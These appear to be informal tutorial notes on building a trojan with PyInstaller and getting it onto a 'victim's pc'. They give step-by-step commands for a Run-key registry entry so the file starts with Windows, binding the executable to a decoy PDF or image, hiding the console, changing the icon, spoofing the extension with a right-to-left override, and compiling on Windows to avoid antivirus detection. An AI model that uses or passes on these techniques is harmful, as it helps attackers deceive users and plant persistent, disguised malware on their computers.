" " " Packaging & Malicious Files " " "
Converting a python file(.py) into .exe
First install 'pyinstaller' which is a python module. Search for the location of pyinstaller.exe
In cmd, : <.\.\...\pyinstaller.exe> <python_file.py> --onefile  (onefile, since compiling the whole program in one file) and your .exe file will be saved in the dist folder.
Now we'll try to add this to our startup, so that the file runs whenever windows starts.
We gotta use regedit for that and we can do it by 2 ways:
1) Directly open regedit from cmd, and-> Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run, and manually add by ->rightClick->new
2)on cmd: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <file_name> /t REG_SZ /d "<location of that file>"
  HKCU=HKEY_CURRENT_USER, v for filename, t=type, d=destination
  eg:- reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v hacked /t REG_SZ /d "C:\Users\Desktop\hack.exe"	
2nd method will be used, since we want to do it on victim's pc, we'll be using the subprocess module in python for it.
We'll hide the exe file somewhere in the victim's pc, so that the victim doesn't delete it.
We'll attatch the mailcious .exe wuth a pdf(or an image), so that when user clicks on the exe file, the pdf will open, and our main file will run in the background.
Even after the user closes, everytime the user restarts the pc, the terminal will pop (print "hAcKeD...")


'''Changing Icons, No Console, Changing extensions''' [not required]
Download any image and convert it into .ico format
In cmd, : <.\.\...\pyinstaller.exe> <python_file.py> --onefile --add-data "location\of\the\pdf\file.pdf;." --noconsole --icon <icon/path.ico>
(--noconsole will not pop any terminal/console, --icon for icon.

*** But note that, if we wanted to use subprocess.check_output anywhere in our python file/executable/exe it wont work if we are using --noconsole.***
In order to rectify it, use the below method for it:-
my_check = subprocess.check_output("command",shell=true,stderr=subproceess.DEVNULL,stdin=subproceess.DEVNULL)

Now to change the extension, i.e. from .exe to .pdf for our file, you can again use lef-to-right overider which is there in kali, or can search a tool online.
Remember, it's better to build and compile are executables/.exe file in windows, if windows is our target, since there will be less risk that windows detects our file as malicious.
